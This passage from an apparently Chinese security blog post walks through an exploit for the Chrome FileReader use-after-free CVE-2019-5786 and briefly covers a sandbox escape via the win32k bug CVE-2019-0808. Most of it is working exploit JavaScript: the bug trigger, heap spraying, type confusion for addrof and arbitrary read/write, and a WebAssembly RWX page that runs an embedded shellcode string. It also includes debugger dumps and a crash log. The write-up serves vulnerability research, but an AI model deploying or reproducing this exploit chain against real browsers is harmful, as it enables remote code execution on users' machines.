          <span class="built_in">window</span>.setTimeout(exploit, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`onloadend attempt <span class="subst">$&#123;try_cnt&#125;</span> after <span class="subst">$&#123;onprogress_cnt&#125;</span> onprogress callbacks`</span>);</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="（4）触发漏洞"><a href="#（4）触发漏洞" class="headerlink" title="（4）触发漏洞"></a>（4）触发漏洞</h5><p>直接调用postmessage可以触发漏洞，之后通过捕获到UAF的异常进入catch逻辑，执行get_rw()与rce()</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">reader.onloadend = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// postMessage触发catch，执行漏洞逻辑</span></span><br><span class="line">            myWorker.postMessage([last], [last, lastlast]);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e.message.includes(<span class="string">&#x27;ArrayBuffer at index 1 could not be transferred&#x27;</span>)) &#123;</span><br><span class="line">                get_rw();</span><br><span class="line">                rce();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(e.message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="（5）类型混淆准备，相对地址读写"><a href="#（5）类型混淆准备，相对地址读写" class="headerlink" title="（5）类型混淆准备，相对地址读写"></a>（5）类型混淆准备，相对地址读写</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//向spray[outers][inners]写入特定内容</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reclaim_mixed</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> tmp = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; outers; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j + <span class="number">2</span> &lt; inners; j+=<span class="number">3</span>) &#123;</span><br><span class="line">            spray[i][j] = &#123;<span class="attr">a</span>: marker1, <span class="attr">b</span>: marker2, <span class="attr">c</span>: tmp&#125;;</span><br><span class="line">            spray[i][j].c = spray[i][j]     <span class="comment">// 自己指向自己来得到绝对地址</span></span><br><span class="line">            spray[i][j+<span class="number">1</span>] = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">8</span>);</span><br><span class="line">            spray[i][j+<span class="number">2</span>] = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">32</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就是对spray数组循环存取下面的内存布局</p><blockquote><p>{</p><p>​    {</p><p>​        {a: marker1, b: marker2, c:  spray[i][j]};</p><p>​    }    </p><p>​    Array(8);</p><p>​    Uint32Array(32);</p><p>}</p></blockquote><p>之后可以通过tarray搜索到marker1的flag内存区域，然后根据偏移找到对象地址以及tarray的首地址</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">tarray = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(lastlast);             <span class="comment">//倒数第二个onprogress返回值。</span></span><br><span class="line"><span class="comment">// find_pattern的过程</span></span><br><span class="line">object_prop_taidx = find_pattern();             <span class="comment">//通过marker1寻找偏移</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 泄漏对象的绝对地址</span></span><br><span class="line"><span class="keyword">const</span> obj_absolute_addr = tarray[object_prop_taidx + <span class="number">2</span>] - <span class="number">1</span>;  <span class="comment">//通过 spray[i][j].c 泄露对象的地址</span></span><br><span class="line">ta_absolute_addr = obj_absolute_addr - (object_prop_taidx-<span class="number">3</span>)*<span class="number">4</span>   </span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`leaked absolute address of our object <span class="subst">$&#123;obj_absolute_addr.toString(<span class="number">16</span>)&#125;</span>`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`leaked absolute address of ta <span class="subst">$&#123;ta_absolute_addr.toString(<span class="number">16</span>)&#125;</span>`</span>);</span><br><span class="line">reader_obj = get_obj_idx(object_prop_taidx);                        <span class="comment">//通过tarray的索引找到spray的索引</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">// 现在reader_obj是对Object的引用，object_prop_taidx是从ta开头的第一个内联属性的索引</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`addrof(reader_obj) == <span class="subst">$&#123;addrof(reader_obj)&#125;</span>`</span>);             <span class="comment">//这个addrof(reader_obj)-1 == obj_absolute_addr</span></span><br><span class="line">aarw_ui32 = get_corruptable_ui32a();                <span class="comment">//这个函数返回了很多东西</span></span><br></pre></td></tr></table></figure><p>spray[i][j]的内存现场如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:016&gt; dd 9770B8C</span><br><span class="line">09770b8c  047008bd 03a0066d 03a0066d 6c626466</span><br><span class="line">09770b9c  6e828a8c 09770b8d 03a00435 00000010</span><br></pre></td></tr></table></figure><p>之后得到了相对地址读写的功能</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ta_read</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 通过原始的释放区域读取绝对地址</span></span><br><span class="line">    <span class="comment">// 最大长度为ta_absolute_addr + string_size（128MiB）</span></span><br><span class="line">    <span class="keyword">if</span> (addr &gt; ta_absolute_addr &amp;&amp; addr &lt; ta_absolute_addr + string_size) &#123;</span><br><span class="line">        <span class="keyword">return</span> tarray[(addr-ta_absolute_addr)/<span class="number">4</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ta_write</span>(<span class="params">addr, value</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 通过原始的释放区域写入绝对地址</span></span><br><span class="line">    <span class="comment">// 最大长度为ta_absolute_addr + string_size（128MiB）</span></span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">4</span> || value &gt; <span class="number">2</span>**<span class="number">32</span> - <span class="number">1</span> ||</span><br><span class="line">        addr &lt; ta_absolute_addr ||</span><br><span class="line">        addr &gt; ta_absolute_addr + string_size) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`invalid args passed to ta_write(<span class="subst">$&#123;addr.toString(<span class="number">16</span>)&#125;</span>, <span class="subst">$&#123;value&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    tarray[(addr-ta_absolute_addr)/<span class="number">4</span>] = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就可以通过类型混淆得到addressof的功能了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">leaked_obj</span>) </span>&#123;</span><br><span class="line">    reader_obj.a = leaked_obj;</span><br><span class="line">    <span class="keyword">return</span> tarray[object_prop_taidx];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="（6）任意地址读写"><a href="#（6）任意地址读写" class="headerlink" title="（6）任意地址读写"></a>（6）任意地址读写</h5><p>利用相对地址读写可以读写被腐烂缓冲区的backing_store，从而达到任意地址读写的目的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_corruptable_ui32a</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 找到一个喷射的Uint32Array，其元素指针也落入受控区域</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; outers; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j + <span class="number">2</span> &lt; inners; j+=<span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> ui32a_addr = addrof(spray[i][j+<span class="number">2</span>]) - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">let</span> bs_addr = ta_read(ui32a_addr + <span class="number">12</span>) - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">let</span> elements_addr = ta_read(ui32a_addr + <span class="number">8</span>) - <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 读取其元素指针</span></span><br><span class="line">            <span class="comment">// 如果元素指针位于我们可以访问的区域内</span></span><br><span class="line">            <span class="keyword">if</span> (bs_addr &gt;= ta_absolute_addr &amp;&amp; bs_addr &lt; ta_absolute_addr + string_size &amp;&amp; </span><br><span class="line">                elements_addr &gt;= ta_absolute_addr &amp;&amp; elements_addr &lt; ta_absolute_addr + string_size) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`found corruptable Uint32Array-&gt;elements at <span class="subst">$&#123;bs_addr.toString(<span class="number">16</span>)&#125;</span>, on Uint32Array idx <span class="subst">$&#123;i&#125;</span> <span class="subst">$&#123;j&#125;</span>`</span>);</span><br><span class="line">                <span class="keyword">return</span> &#123;</span><br><span class="line">                    <span class="attr">bs_addr</span>: bs_addr,</span><br><span class="line">                    <span class="attr">elements_addr</span>: elements_addr,</span><br><span class="line">                    <span class="attr">ui32</span>: spray[i][j+<span class="number">2</span>],</span><br><span class="line">                    <span class="attr">i</span>: i, <span class="attr">j</span>: j</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read4</span>(<span class="params">addr</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// save the old values</span></span><br><span class="line">    <span class="keyword">let</span> tmp1 = ta_read(aarw_ui32.elements_addr + <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">let</span> tmp2 = ta_read(aarw_ui32.bs_addr + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// rewrite the backing store ptr</span></span><br><span class="line">    ta_write(aarw_ui32.elements_addr + <span class="number">12</span>, addr); </span><br><span class="line">    ta_write(aarw_ui32.bs_addr + <span class="number">16</span>, addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> val = aarw_ui32.ui32[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    ta_write(aarw_ui32.elements_addr + <span class="number">12</span>, tmp1); </span><br><span class="line">    ta_write(aarw_ui32.bs_addr + <span class="number">16</span>, tmp2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write4</span>(<span class="params">addr, val</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// save the old values</span></span><br><span class="line">    <span class="keyword">let</span> tmp1 = ta_read(aarw_ui32.elements_addr + <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">let</span> tmp2 = ta_read(aarw_ui32.bs_addr + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// rewrite the backing store ptr</span></span><br><span class="line">    ta_write(aarw_ui32.elements_addr + <span class="number">12</span>, addr); </span><br><span class="line">    ta_write(aarw_ui32.bs_addr + <span class="number">16</span>, addr);</span><br><span class="line"></span><br><span class="line">    aarw_ui32.ui32[<span class="number">0</span>] = val;</span><br><span class="line"></span><br><span class="line">    ta_write(aarw_ui32.elements_addr + <span class="number">12</span>, tmp1); </span><br><span class="line">    ta_write(aarw_ui32.bs_addr + <span class="number">16</span>, tmp2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="（7）利用WebAssembly技术申请RWX空间，替换shellcode并执行"><a href="#（7）利用WebAssembly技术申请RWX空间，替换shellcode并执行" class="headerlink" title="（7）利用WebAssembly技术申请RWX空间，替换shellcode并执行"></a>（7）利用WebAssembly技术申请RWX空间，替换shellcode并执行</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wfunc = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">let</span> meterpreter = <span class="built_in">unescape</span>(<span class="string">&quot;%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u652e%u6578%u4100&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_wasm_func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> importObject = &#123;</span><br><span class="line">            <span class="attr">imports</span>: &#123; <span class="attr">imported_func</span>: <span class="function"><span class="params">arg</span> =&gt;</span> <span class="built_in">console</span>.log(arg) &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        bc = [<span class="number">0x0</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6d</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="number">0x2</span>, <span class="number">0x60</span>, <span class="number">0x1</span>, <span class="number">0x7f</span>, <span class="number">0x0</span>, <span class="number">0x60</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x19</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>, <span class="number">0x70</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x73</span>, <span class="number">0xd</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>, <span class="number">0x70</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x5f</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6e</span>, <span class="number">0x63</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x11</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0x65</span>, <span class="number">0x78</span>, <span class="number">0x70</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x5f</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6e</span>, <span class="number">0x63</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x8</span>, <span class="number">0x1</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x2a</span>, <span class="number">0x10</span>, <span class="number">0x0</span>, <span class="number">0xb</span>];</span><br><span class="line">        wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(bc);</span><br><span class="line">        wasm_mod = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasm_code), importObject);</span><br><span class="line">        <span class="keyword">return</span> wasm_mod.exports.exported_func;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> wasm_func = get_wasm_func();</span><br><span class="line">    wfunc = wasm_func;</span><br><span class="line">    <span class="comment">// traverse the JSFunction object chain to find the RWX WebAssembly code page</span></span><br><span class="line">    <span class="keyword">let</span> wasm_func_addr = addrof(wasm_func) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> sfi = read4(wasm_func_addr + <span class="number">12</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> WasmExportedFunctionData = read4(sfi + <span class="number">4</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> instance = read4(WasmExportedFunctionData + <span class="number">8</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> rwx_addr = read4(instance + <span class="number">0x74</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向RWX内存页中写入shellcode</span></span><br><span class="line">    <span class="keyword">if</span> (meterpreter.length % <span class="number">2</span> != <span class="number">0</span>)</span><br><span class="line">        meterpreter += <span class="string">&quot;\\u9090&quot;</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; meterpreter.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">        write4(rwx_addr + i*<span class="number">2</span>, meterpreter.charCodeAt(i) + meterpreter.charCodeAt(i + <span class="number">1</span>) * <span class="number">0x10000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 到了这步证明攻击已经成功了</span></span><br><span class="line">    <span class="built_in">window</span>.top.postMessage(<span class="string">&#x27;SUCCESS&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用shellcode</span></span><br><span class="line">    <span class="built_in">window</span>.setTimeout(wfunc, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>blink的漏洞利用相对于v8的类型混淆来说看起来好像更复杂一些，需要的操作也要更麻烦一些，但是利用的核心思想仍然是类型混淆造成任意地址读写，并通过WebAssembly技术进行rce。</p><p>该漏洞利用程序开发的难点在于调试环境的获取，由于某些已知原因，国内的chromium源码编译环境异常难以搭建，只能通过符号服务器或者符号文件+二进制程序进行二进制层面的调试，这样就对exp的调试造成了比较大的阻碍。</p><h4 id="（5）简述CVE-2019-0808与沙箱逃逸"><a href="#（5）简述CVE-2019-0808与沙箱逃逸" class="headerlink" title="（5）简述CVE-2019-0808与沙箱逃逸"></a>（5）简述CVE-2019-0808与沙箱逃逸</h4><p>本节内容参考[16]，[17]</p><p>我们知道，Chrome基于多进程架构，主要包括浏览器进程和渲染进程，进程间通过IPC通信（Mojo）</p><p>其中渲染进程运行着不可信的HTML和JS代码，浏览器中的每一个tab为一个独立的进程，运行在Untrusted的低权限等级，并通过沙箱引擎隔离。因此像CVE-2019-5768这样的渲染进程中的远程代码执行漏洞仍需要结合其他高权限漏洞实现沙箱逃逸。一般来说有几种思路：1）利用浏览器进程的漏洞，比如IndexedDB，Mojo等； 2）利用操作系统内核漏洞，比如与CVE-2019-5768组合的win32k.sys内核提权漏洞CVE-2019-0808。</p><p>CVE-2019-0808是win32k.sys中的一个空指针解引用漏洞。由于代码未对返回窗口指针的类型进行检查，导致程序可以进行空指针解引用，由于win8以上的windows无法在零页分配内存，所以该漏洞的危害性相对较低，不过仍然可以配合CVE-2019-5786达到杀向逃逸的目的。</p><p>简单描述一下CVE-2019-0808的漏洞原理，xxxMNFindWindowFromPoint函数通过xxxSendMessage获取pPopupMenu，之后并未对pPopupMenu做任何校验，攻击者通过SetWinEventHook获取该事件伪造NULL指针赋值给pPopupMenu-&gt;spmenu并返回给内核，触发漏洞。</p><p>在完成了内核提权exp后，接下来需要考虑如何结合Chrome渲染进程的漏洞实现沙箱逃逸。首先可以考虑将内核提权exp以dll的形式编译，然后加载到目标进程，执行提权操作。但是由于Chrome渲染进程运行在Untrusted权限，无法直接利用漏洞获取shellcode执行权限后注入提权dll，需要考虑其他方法。</p><p>反射型dll注入就是一个比较好的方法，github中有相关项目可以直接使用[18]：</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210531200032149.png" alt="image-20210531200032149"></p><p>该利用链参考[19]，实测发现个人机器在关闭沙箱时可以执行shellcode弹出system的cmd，但是在开启沙箱的时候会造成下述状况：</p><p><img src="/2021/05/31/CVE-2019-5786/image-20210531202300623.png" alt="image-20210531202300623"></p><p>crash log如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">VIRTUAL_MACHINE:  VMware</span><br><span class="line"></span><br><span class="line">BUGCHECK_CODE:  1</span><br><span class="line"></span><br><span class="line">BUGCHECK_P1: 114d</span><br><span class="line"></span><br><span class="line">BUGCHECK_P2: 0</span><br><span class="line"></span><br><span class="line">BUGCHECK_P3: ffff</span><br><span class="line"></span><br><span class="line">BUGCHECK_P4: 0</span><br><span class="line"></span><br><span class="line">CUSTOMER_CRASH_COUNT:  1</span><br><span class="line"></span><br><span class="line">PROCESS_NAME:  chrome.exe</span><br><span class="line"></span><br><span class="line">STACK_TEXT:  </span><br><span class="line">    &lt;Intermediate frames may have been skipped due to lack of complete unwind&gt;</span><br><span class="line">8ade0c34 779270b4 (T) badb0d00 8ade0b00 00000000 nt!KiServiceExit2+0x17a</span><br><span class="line">WARNING: Frame IP not in any known module. Following frames may be wrong.</span><br><span class="line">    &lt;Intermediate frames may have been skipped due to lack of complete unwind&gt;</span><br><span class="line">8ade0b34 00000000 (T) 00000000 00000000 00000000 0x779270b4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SYMBOL_NAME:  nt!KiServiceExit2+17a</span><br><span class="line"></span><br><span class="line">MODULE_NAME: nt</span><br><span class="line"></span><br><span class="line">IMAGE_NAME:  ntkrpamp.exe</span><br><span class="line"></span><br><span class="line">IMAGE_VERSION:  6.1.7601.17514</span><br><span class="line"></span><br><span class="line">STACK_COMMAND:  .thread ; .cxr ; kb</span><br><span class="line"></span><br><span class="line">FAILURE_BUCKET_ID:  0x1_SysCallNum_11ea_nt!KiServiceExit2+17a</span><br><span class="line"></span><br><span class="line">OS_VERSION:  7.1.7601.17514</span><br><span class="line"></span><br><span class="line">BUILDLAB_STR:  win7sp1_rtm</span><br><span class="line"></span><br><span class="line">OSPLATFORM_TYPE:  x86</span><br><span class="line"></span><br><span class="line">OSNAME:  Windows 7</span><br><span class="line"></span><br><span class="line">FAILURE_ID_HASH:  &#123;8f36ef45-2344-18c7-dc3e-a379cfe2ebc4&#125;</span><br><span class="line"></span><br><span class="line">Followup:     MachineOwner</span><br><span class="line">---------</span><br></pre></td></tr></table></figure><h2 id="四、总结与思考"><a href="#四、总结与思考" class="headerlink" title="四、总结与思考"></a>四、总结与思考</h2><p>该漏洞为blink相关的逻辑漏洞，由于异步的特性导致代码逻辑出现问题，最终生成了两个指向同一内存的指针，该漏洞的质量很高，在被曝出时就被发现与CVE-2019-0808配合绕过沙箱实现RCE，是一个比较值得研究的blink漏洞。</p><h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><p>[1] <a class="link"   href="https://developer.mozilla.org/zh-CN/docs/Web/API/FileReader" >https://developer.mozilla.org/zh-CN/docs/Web/API/FileReader<i class="fas fa-external-link-alt"></i></a></p><p>[2] <a class="link"   href="https://www.chromium.org/developers/how-tos/debugging-on-windows/windbg-help" >https://www.chromium.org/developers/how-tos/debugging-on-windows/windbg-help<i class="fas fa-external-link-alt"></i></a></p><p>[3] <a class="link"   href="https://www.chromium.org/getting-involved/download-chromium" >https://www.chromium.org/getting-involved/download-chromium<i class="fas fa-external-link-alt"></i></a></p><p>[4] <a class="link"   href="https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/612429/" >https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/612429/<i class="fas fa-external-link-alt"></i></a></p><p>[5] <a class="link"   href="https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win/612432/" >https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win/612432/<i class="fas fa-external-link-alt"></i></a></p><p>[6] <a class="link"   href="http://www.ruanyifeng.com/blog/2018/07/web-worker.html" 